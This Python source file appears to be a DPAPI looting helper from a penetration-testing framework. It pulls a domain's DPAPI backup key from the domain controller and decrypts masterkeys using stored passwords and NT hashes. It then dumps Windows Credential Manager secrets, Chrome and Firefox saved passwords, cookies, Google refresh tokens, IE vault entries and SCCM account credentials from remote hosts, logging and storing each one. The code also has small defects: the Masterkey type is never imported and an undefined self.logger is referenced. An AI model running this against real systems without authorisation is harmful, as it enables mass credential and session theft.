from typing import List

from dploot.lib.network import DPLootConnection
from dploot.lib.network.smb import SMBTarget, DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage.backupkey import BackupkeyTriage
from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken, Cookie
from dploot.triage.cng import CngTriage
from dploot.triage.credentials import CredentialsTriage
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.sccm import SCCMTriage, SCCMCred, SCCMSecret, SCCMCollection
from dploot.triage.vaults import VaultsTriage

from nxc.helpers.firefox import FirefoxCookie, FirefoxData, FirefoxTriage

def get_domain_backup_key(context):
    pvkbytes = None
    try:
        results = context.db.get_domain_backupkey(context.domain)
    except Exception as e:
        print(e)
        context.logger.fail(
            "Your version of nxcdb is not up to date, run nxcdb and create a new workspace: \
            'workspace create dpapi' then re-run the dpapi option"
        )
        return False
    if len(results) > 0:
        context.logger.success("Loading domain backupkey from nxcdb...")
        pvkbytes = results[0][2]
    elif context.no_da is None and context.args.local_auth is False:
        try:
            dc_target = SMBTarget.create(
                domain=context.domain,
                username=context.username,
                password=context.password,
                address=context.domain,  # querying DNS server for domain will return DC
                lmhash=context.lmhash,
                nthash=context.nthash,
                do_kerberos=context.kerberos,
                aesKey=context.aesKey,
                no_pass=True,
                use_kcache=context.use_kcache,
            )
            dc_conn = DPLootSMBConnection(dc_target)
            dc_conn.connect()  # Connect to DC
            if dc_conn.is_admin():
                context.logger.success("User is Domain Administrator, exporting domain backupkey...")
                backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
                backupkey = backupkey_triage.triage_backupkey()
                pvkbytes = backupkey.backupkey_v2
                context.db.add_domain_backupkey(context.domain, pvkbytes)
            else:
                context.no_da = False
        except Exception as e:
            context.logger.fail(f"Could not get domain backupkey: {e}")
    return pvkbytes

def collect_masterkeys_from_target(context, target, dploot_connection, user=True, dpapi_system_key=None):
    masterkeys = []
    plaintexts = {}
    nthashes = {}
    if context.args.mkfile is not None:
        try:
            masterkeys += parse_masterkey_file(context.args.mkfile)
        except Exception as e:
            context.logger.fail(str(e))
    if user:
        plaintexts = {username: password for _, _, username, password, _, _ in context.db.get_credentials(cred_type="plaintext")}
        nthashes = {username: nt.split(":")[1] if ":" in nt else nt for _, _, username, nt, _, _ in context.db.get_credentials(cred_type="hash")}
        # dploot matches user.lower()
        if context.password != "":
            plaintexts[context.username.lower()] = context.password
        if context.nthash != "":
            nthashes[context.username.lower()] = context.nthash

    # Collect User and Machine masterkeys
    try:
        context.logger.display("Collecting DPAPI masterkeys, grab a coffee and be patient...")
        masterkeys_triage = MasterkeysTriage(
            target=target,
            conn=dploot_connection,
            pvkbytes=context.pvkbytes,
            passwords=plaintexts,
            nthashes=nthashes,
            dpapiSystem=dpapi_system_key,
        )
        context.logger.debug(f"Masterkeys Triage: {masterkeys_triage}")
        if user:
            context.logger.debug("Collecting user masterkeys")
            masterkeys += masterkeys_triage.triage_masterkeys()
        if dpapi_system_key is not None:
            context.logger.debug("Collecting machine masterkeys")
            masterkeys += masterkeys_triage.triage_system_masterkeys()
    except Exception as e:
        context.logger.debug(f"Could not get masterkeys: {e}")

    return masterkeys

def upgrade_to_dploot_connection(target, context=None, protocol:str="smb"):
    conn = None
    try:
        match protocol:
            case "smb":
                from dploot.lib.network.smb import DPLootSMBConnection
                conn = DPLootSMBConnection(target)
                if context is not None:
                    conn.smb_session = context.conn
                else:
                    conn.connect()
            case "wmi":
                from dploot.lib.network.wmi import DPLootWMIConnection
                conn = DPLootWMIConnection(target)
                if context is not None:
                    conn.dcom = context.dcom_conn
                    conn.iWbemLevel1Login = context.iWbemLevel1Login
                else:
                    conn.connect()
            case "winrm":
                from dploot.lib.network.winrm import DPLootWINRMConnection
                conn = DPLootWINRMConnection(target)
                if context is not None:
                    conn.conn = context.conn
                else:
                    conn.connect()
            case "mssql":
                from dploot.lib.network.mssql import MSSQLTarget
    except Exception as e:
        print(e)
        return None
    
    return conn

class DPAPITriage:
    def __init__(self, context, target:Target, conn:DPLootConnection, dump_cookies:bool=False):
        self.context = context
        self.target = target
        self.conn = conn

        self.dump_cookies = dump_cookies
        
    def triage_credentials(self, masterkeys: List[Masterkey]):
        # Collect User and Machine Credentials Manager secrets
        def credential_callback(credential):
            tag = "CREDENTIAL"
            line = f"[{credential.winuser}][{tag}] {credential.target} - {credential.username}:{credential.password}"
            self.context.logger.highlight(line)
            if self.context.output_file:
                self.context.output_file.write(line + "\n")
            self.context.db.add_dpapi_secrets(
                self.target.address,
                tag,
                credential.winuser,
                credential.username,
                credential.password,
                credential.target,
            )

        try:
            credentials_triage = CredentialsTriage(target=self.target, conn=self.conn, masterkeys=masterkeys, per_credential_callback=credential_callback)
            self.context.logger.debug(f"Credentials Triage Object: {credentials_triage}")
            credentials_triage.triage_credentials()
            credentials_triage.triage_system_credentials()
        except Exception as e:
            self.context.logger.debug(f"Error while looting credentials: {e}")

    def triage_chromium(self, masterkeys: List[Masterkey]):
        cng_chromekey = None
        try:
            cng_triage = CngTriage(target=self.target, conn=self.conn, masterkeys=masterkeys)
            for cng_file in cng_triage.triage_system_cng():
                if cng_file.cng_blob["Name"].decode("utf-16le").rstrip("\0") == "Google Chromekey1":
                    self.context.logger.debug("Found CNG Google ChromeKey1\n")
                    cng_chromekey = cng_file.decrypted_private_key
        except Exception as e:
            self.context.logger.debug(f"Error while getting CNG ChromeKey1: {e}")
            
        # Collect Chrome Based Browser stored secrets
        def browser_callback(secret):
            if isinstance(secret, LoginData):
                secret_url = secret.url + " -" if secret.url != "" else "-"
                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret_url} {secret.username}:{secret.password}"
                self.context.logger.highlight(line)
                if self.context.output_file:
                    self.context.output_file.write(line + "\n")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    secret.browser.upper(),
                    secret.winuser,
                    secret.username,
                    secret.password,
                    secret.url,
                )
            elif isinstance(secret, GoogleRefreshToken):
                line = f"[{secret.winuser}][{secret.browser.upper()}] Google Refresh Token: {secret.service}:{secret.token}"
                self.context.logger.highlight(line)
                if self.context.output_file:
                    self.context.output_file.write(line + "\n")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    secret.browser.upper(),
                    secret.winuser,
                    secret.service,
                    secret.token,
                    "Google Refresh Token",
                )
            elif isinstance(secret, Cookie):
                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret.host}{secret.path} - {secret.cookie_name}:{secret.cookie_value}"
                self.context.logger.highlight(line)
                if self.context.output_file:
                    self.context.output_file.write(line + "\n")

        try:
            browser_triage = BrowserTriage(target=self.target, conn=self.conn, masterkeys=masterkeys, per_secret_callback=browser_callback)
            browser_triage.triage_browsers(gather_cookies=self.dump_cookies, cng_chromekey=cng_chromekey)
        except Exception as e:
            self.context.logger.debug(f"Error while looting browsers: {e}")

    def triage_vaults(self, masterkeys: List[Masterkey]):
        def vault_callback(secret):
            tag = "IEX"
            if secret.type == "Internet Explorer":
                resource = secret.resource + " -" if secret.resource != "" else "-"
                line = f"[{secret.winuser}][{tag}] {resource} - {secret.username}:{secret.password}"
                self.context.logger.highlight(line)
                if self.context.output_file:
                    self.context.output_file.write(line + "\n")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    tag,
                    secret.winuser,
                    secret.username,
                    secret.password,
                    secret.resource,
                )

        try:
            # Collect User Internet Explorer stored secrets
            vaults_triage = VaultsTriage(target=self.target, conn=self.conn, masterkeys=masterkeys, per_vault_callback=vault_callback)
            vaults_triage.triage_vaults()
        except Exception as e:
            self.context.logger.debug(f"Error while looting vaults: {e}")

    def triage_firefox(self):
        def firefox_callback(secret):
            tag = "FIREFOX"
            if isinstance(secret, FirefoxData):
                url = secret.url + " -" if secret.url != "" else "-"
                line = f"[{secret.winuser}][{tag}] {url} {secret.username}:{secret.password}"
                self.context.logger.highlight(line)
                if self.context.output_file:
                    self.context.output_file.write(line + "\n")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    tag,
                    secret.winuser,
                    secret.username,
                    secret.password,
                    secret.url,
                )
            elif isinstance(secret, FirefoxCookie):
                line = f"[{secret.winuser}][{tag}] {secret.host}{secret.path} {secret.cookie_name}:{secret.cookie_value}"
                self.context.logger.highlight(line)
                if self.context.output_file:
                    self.context.output_file.write(line + "\n")

        try:
            # Collect Firefox stored secrets
            firefox_triage = FirefoxTriage(target=self.target, logger=self.context.logger, conn=self.conn, per_secret_callback=firefox_callback)
            firefox_triage.run(gather_cookies=self.dump_cookies)
        except Exception as e:
            self.logger.debug(f"Error while looting firefox: {e}")

    def triage(self, masterkeys: List[Masterkey]):
        self.triage_credentials(masterkeys)
        self.triage_chromium(masterkeys)
        self.triage_vaults(masterkeys)
        self.triage_firefox()

    def triage_sccm(self, masterkeys: List[Masterkey]):
        def sccm_callback(secret):
            if isinstance(secret, SCCMCred):
                tag = "NAA Account"
                self.context.logger.highlight(f"[{tag}] {secret.username.decode('latin-1')}:{secret.password.decode('latin-1')}")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    f"SCCM - {tag}",
                    "SYSTEM",
                    secret.username.decode("latin-1"),
                    secret.password.decode("latin-1"),
                    "N/A",
                )
            elif isinstance(secret, SCCMSecret):
                tag = "Task sequences secret"
                self.context.logger.highlight(f"[{tag}] {secret.secret.decode('latin-1')}")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    f"SCCM - {tag}",
                    "SYSTEM",
                    "N/A",
                    secret.secret.decode("latin-1"),
                    "N/A",
                )
            elif isinstance(secret, SCCMCollection):
                tag = "Collection Variable"
                self.context.logger.highlight(f"[{tag}] {secret.variable.decode('latin-1')}:{secret.value.decode('latin-1')}")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    f"SCCM - {tag}",
                    "SYSTEM",
                    secret.variable.decode("latin-1"),
                    secret.value.decode("latin-1"),
                    "N/A",
                )
        try:
            sccm_triage = SCCMTriage(target=self.target, conn=self.conn, masterkeys=masterkeys, per_secret_callback=sccm_callback)
            sccm_triage.triage_sccm()
        except Exception as e:
            self.logger.debug(f"Error while looting sccm: {e}")